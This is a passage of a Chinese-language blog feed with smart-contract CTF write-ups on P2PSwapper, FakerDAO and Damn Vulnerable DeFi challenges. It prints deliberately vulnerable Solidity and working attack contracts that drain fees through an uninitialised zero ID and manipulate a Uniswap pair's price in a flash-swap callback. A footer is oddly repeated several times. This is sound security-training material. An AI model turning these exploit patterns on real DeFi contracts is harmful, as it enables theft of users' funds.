address(p2pweth), &quot;P2PSwapper: transfer not allowed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><p>根据题目可发现漏洞，题目漏洞主要在于未初始化引起的问题。当我们调用createDeal函数时，函数createDeal中未判断userByAddress[msg.sender]的合法性，因此可能导致零ID拥有partnerFees。这肯定是不合法的，然后因为零ID这个不合法参数拥有了partnerFees，因此合约就有了微小的漏洞了。我们继续寻找漏洞。我们想要窃取合约的fee,我们需要观察withdrawFees函数。我们发现函数withdrawFees中也未判断userByAddress[user]的合法性，因此也可出现零ID，而零ID也有partnerFees。同时userByAddress[msg.sender]也可能是不合法参数零ID，因此通过 require(partnerById[userId] &#x3D;&#x3D; userByAddress[msg.sender], “P2PSwapper: user is not your referral”);我们就可以提取费用了。然后我们再用其他的未初始化的user参数，仍可以继续提取费用，那么我们就可以无限的提取费用了。</p><p>因此造成漏洞的原因在于未进行判断参数的合法性，以及未初始化的问题。</p><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">  P2PSwapper P2P;</span><br><span class="line">  P2P_WETH weth;</span><br><span class="line">  constructor(address payable we,address payable _P2P)public payable&#123;</span><br><span class="line">    require(msg.value==1 ether);</span><br><span class="line">    weth=P2P_WETH(we);</span><br><span class="line">    P2P=P2PSwapper(_P2P);</span><br><span class="line">  &#125;</span><br><span class="line">  function start()public&#123;//初始化Intance合约</span><br><span class="line">    weth.deposit&#123;value:31338&#125;();</span><br><span class="line">    weth.transfer(address(P2P),31338);</span><br><span class="line">  &#125;</span><br><span class="line">  function attack()public&#123;</span><br><span class="line">    weth.deposit&#123;value:31338&#125;();</span><br><span class="line">    weth.approve(address(P2P),31338);</span><br><span class="line">    P2P.createDeal&#123;value:62676&#125;(address(weth),1,address(weth),1);</span><br><span class="line">    P2P.withdrawFees(address(this));</span><br><span class="line">    P2P.withdrawFees(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">  fallback()external payable&#123;&#125;</span><br><span class="line">  function self()public&#123;</span><br><span class="line">    selfdestruct(payable(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-FakerDAO"><a href="#4-FakerDAO" class="headerlink" title="4.FakerDAO"></a>4.FakerDAO</h1><h2 id="Request-3"><a href="#Request-3" class="headerlink" title="Request"></a>Request</h2><p>FakerDAO is the best lending protocol! Only at FakerDAO you can borrow a LAMBO if you provide enough collateral in LP tokens!</p><p>You have 5000 YIN and 5000 YANG, can you borrow 1 LAMBO?</p><p>&#x2F;&#x2F;pair初始：amount0和amount1和_totalSupply都是1000000*10 **18</p><p>&#x2F;&#x2F;我手中有5000 YIN and 5000 YANG</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FakerDAO is ERC20, ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    address public immutable pair;</span><br><span class="line"></span><br><span class="line">    constructor (address _pair) public ERC20(&quot;Lambo&quot;, &quot;LAMBO&quot;) &#123;</span><br><span class="line">        // _setupDecimals(0);</span><br><span class="line">        pair = _pair; // Uniswap YIN-YANG pair</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function borrow(uint256 _amount) public nonReentrant &#123;</span><br><span class="line">        uint256 _balance = Pair(pair).balanceOf(msg.sender);</span><br><span class="line">        uint256 _tokenPrice = price();</span><br><span class="line">        uint256 _depositRequired = _amount.mul(_tokenPrice);</span><br><span class="line"></span><br><span class="line">        require(_balance &gt;= _depositRequired, &quot;Not enough collateral&quot;);</span><br><span class="line"></span><br><span class="line">        // we get LP tokens</span><br><span class="line">        Pair(pair).transferFrom(msg.sender, address(this), _depositRequired);</span><br><span class="line">        // you get a LAMBO</span><br><span class="line">        _mint(msg.sender, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() public view returns (uint256) &#123;</span><br><span class="line">        address token0 = Pair(pair).token0();</span><br><span class="line">        address token1 = Pair(pair).token1();</span><br><span class="line">        uint256 _reserve0 = IERC20(token0).balanceOf(pair);</span><br><span class="line">        uint256 _reserve1 = IERC20(token1).balanceOf(pair);</span><br><span class="line">        return (_reserve0 * _reserve1) / Pair(pair).totalSupply();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library $</span><br><span class="line">&#123;</span><br><span class="line">    address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten</span><br><span class="line">    address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface PoolToken is IERC20</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Pair is PoolToken</span><br><span class="line">&#123;</span><br><span class="line">    function token0() external view returns (address _token0);</span><br><span class="line">    function token1() external view returns (address _token1);</span><br><span class="line">    function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);</span><br><span class="line">    function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);</span><br><span class="line">    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);</span><br><span class="line">    function mint(address _to) external returns (uint256 _liquidity);</span><br><span class="line">    function sync() external;</span><br><span class="line">     function swap(uint amount0Out, uint amount1Out, address addr,bytes memory data) external;</span><br><span class="line">&#125;</span><br><span class="line">interface IUniswapV2Router &#123;</span><br><span class="line">    function WETH() external pure returns (address _token);</span><br><span class="line">    function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">    function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);</span><br><span class="line">    function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);</span><br><span class="line">    function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);</span><br><span class="line">    function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h2><p>题目要求我们获取一个LPtoken,所以我们应该borrow一个代币。我们就应该想办法让price()变小就可以了。在此之前我们需要获取一定的pair流动性。考虑如何把_reserve0 * _reserve1变小，我们知道swap的时候会和flashloan的功能相似，合约会先给用户转走用户需要的钱，然后回调用户合约。再进行判断k值是否变化。因此我们swap的时候k值会变化，然后我们在回调函数的时候可以进行borrow，然后再回复k值，从而完成攻击。</p><h2 id="Attack-2"><a href="#Attack-2" class="headerlink" title="Attack"></a>Attack</h2><p>Step:</p><ol><li>step1：获得token0和token1地址</li><li>step2：部署攻击合约</li><li>step3：IERC20(token0).transfer(Attack,5000*10**18)</li><li>step4：IERC20(token1).transfer(Attack,5000*10**18)</li><li>step5：attack</li><li>step6：toPlayer</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">library $</span><br><span class="line">&#123;</span><br><span class="line">    address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten</span><br><span class="line">    address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface PoolToken is IERC20</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Pair is PoolToken</span><br><span class="line">&#123;</span><br><span class="line">    function token0() external view returns (address _token0);</span><br><span class="line">    function token1() external view returns (address _token1);</span><br><span class="line">    function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);</span><br><span class="line">    function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);</span><br><span class="line">    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);</span><br><span class="line">    function mint(address _to) external returns (uint256 _liquidity);</span><br><span class="line">    function sync() external;</span><br><span class="line">     function swap(uint amount0Out, uint amount1Out, address addr,bytes memory data) external;</span><br><span class="line">&#125;</span><br><span class="line">interface IUniswapV2Router &#123;</span><br><span class="line">    function WETH() external pure returns (address _token);</span><br><span class="line">    function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">    function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);</span><br><span class="line">    function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);</span><br><span class="line">    function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);</span><br><span class="line">    function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//pair初始：amount0和amount1和_totalSupply都是1000000*10 **18</span><br><span class="line">//我手中有5000 YIN and 5000 YANG</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    FakerDAO DAO;</span><br><span class="line">    Pair pair;</span><br><span class="line">    constructor(address _DAO,address _pair)&#123;</span><br><span class="line">        pair=Pair(_pair);</span><br><span class="line">        DAO=FakerDAO(_DAO);</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public&#123;</span><br><span class="line">        address token0 = Pair(pair).token0();</span><br><span class="line">        address token1 = Pair(pair).token1();</span><br><span class="line">        address Router=$.UniswapV2_ROUTER02;</span><br><span class="line">        ERC20(token0).approve(Router,2**255);</span><br><span class="line">        ERC20(token1).approve(Router,2**255);</span><br><span class="line">        pair.approve(address(DAO),2**255);</span><br><span class="line">        IUniswapV2Router(Router).addLiquidity(token0,token1,1000*10**18,1000*10**18,1,1,address(this),999999999999);</span><br><span class="line">        pair.swap(1000999*10**18,1,address(this),&quot;0x00&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function uniswapV2Call(address a,uint amount0Out,uint amount1Out,bytes calldata data)public&#123;</span><br><span class="line">        DAO.borrow(100);</span><br><span class="line">        address token0 = Pair(pair).token0();</span><br><span class="line">        ERC20(token0).transfer(address(pair),1003000*10**18);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn Vulnerable Defi</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Damn%20Vulnerable%20Defi/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/Damn%20Vulnerable%20Defi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01Unstoppable"><a href="#0x01Unstoppable" class="headerlink" title="0x01Unstoppable"></a>0x01Unstoppable</h1><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><p>There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.</p><p>If only there was a way to attack and stop the pool from offering flash loans …</p><p>You start with 100 DVT tokens in balance.</p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title UnstoppableLender</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract UnstoppableLender is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        require(tokenAddress != address(0), &quot;Token address cannot be zero&quot;);</span><br><span class="line">        damnValuableToken = IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositTokens(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Must deposit at least one token&quot;);</span><br><span class="line">        // Transfer token from sender. Sender must have first approved them.</span><br><span class="line">        damnValuableToken.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        poolBalance = poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line"></span><br><span class="line">        // Ensured by the protocol via the `depositTokens` function</span><br><span class="line">        assert(poolBalance == balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse"><a href="#Analyse" class="headerlink" title="Analyse"></a>Analyse</h2><p>要求就是我们攻击这个闪电贷，使其没法正常的flashon,我们发现在flashon中</p><p>assert(poolBalance &#x3D;&#x3D; balanceBefore);如果不相等就会报错，poolBalance 的改变只在depositTokens函数中，因此如果我们不在depositTokens函数中存代币，那么我们就会造成poolBalance不增加与balanceBefore增加，从而不等，完成题目。</p><h1 id="0x02Naive-receiver"><a href="#0x02Naive-receiver" class="headerlink" title="0x02Naive receiver"></a>0x02Naive receiver</h1><h2 id="Request-1"><a href="#Request-1" class="headerlink" title="Request"></a>Request</h2><p>There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.</p><p>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH.</p><p>Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus ;</p><h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><h3 id="FlashLoanReceiver"><a href="#FlashLoanReceiver" class="headerlink" title="FlashLoanReceiver"></a>FlashLoanReceiver</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FlashLoanReceiver</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract FlashLoanReceiver &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    address payable private pool;</span><br><span class="line"></span><br><span class="line">    constructor(address payable poolAddress) &#123;</span><br><span class="line">        pool = poolAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function called by the pool during flash loan</span><br><span class="line">    function receiveEther(uint256 fee) public payable &#123;</span><br><span class="line">        require(msg.sender == pool, &quot;Sender must be pool&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 amountToBeRepaid = msg.value + fee;</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;= amountToBeRepaid, &quot;Cannot borrow that much&quot;);</span><br><span class="line">        </span><br><span class="line">        _executeActionDuringFlashLoan();</span><br><span class="line">        </span><br><span class="line">        // Return funds to pool</span><br><span class="line">        pool.sendValue(amountToBeRepaid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Internal function where the funds received are used</span><br><span class="line">    function _executeActionDuringFlashLoan() internal &#123; &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NaiveReceiverLenderPool</p><p>code</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/">https://bcyng-w.github.io/</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><p>NaiveReceiverLenderPool</p><p>code</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/">https://bcyng-w.github.io/</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><p>NaiveReceiverLenderPool</p><p>code</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/">https://bcyng-w.github.io/</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><p>NaiveReceiverLenderPool</p><p>-——————————–</p><p>Author: bcYng</p><p>Article is from: <a href="https://bcyng-w.github.io/">https://bcyng-w.github.io/</a></p><p>This content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)</p><h3 id="NaiveReceiverLenderPool"><a href="#NaiveReceiverLenderPool" class="headerlink" title="NaiveReceiverLenderPool"></a>NaiveReceiverLenderPool</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title NaiveReceiverLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract NaiveReceiverLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan</span><br><span class="line"></span><br><span class="line">    function fixedFee() external pure returns (uint256) &#123;</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough ETH in pool&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        require(borrower.isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        // Transfer ETH and handle control to receiver</span><br><span class="line">        borrower.functionCallWithValue(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                FIXED_FEE</span><br><span class="line">            ),</span><br><span class="line">            borrowAmount</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        require(</span><br><span class="line">            address(this).balance &gt;= balanceBefore + FIXED_FEE,</span><br><span class="line">            &quot;Flash loan hasn&#x27;t been paid back&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Allow deposits of ETH</span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h2><p>要求就是我们攻击FlashLoanReceiver使其部署在合约中的10个eth消失。我们看到NaiveReceiverLenderPool 中每一次借贷都会要求支付1ether,且其中没有限定调用者是谁，且可以指定调用者，因此我们只要指定为FlashLoanReceiver就可以一直消耗其中的eth了</p><h1 id="0x03Truster"><a href="#0x03Truster" class="headerlink" title="0x03Truster"></a>0x03Truster</h1><h2 id="Request-2"><a href="#Request-2" class="headerlink" title="Request"></a>Request</h2><p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But don’t worry, you might be able to take them all from the pool. In a single transaction.</p><h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import 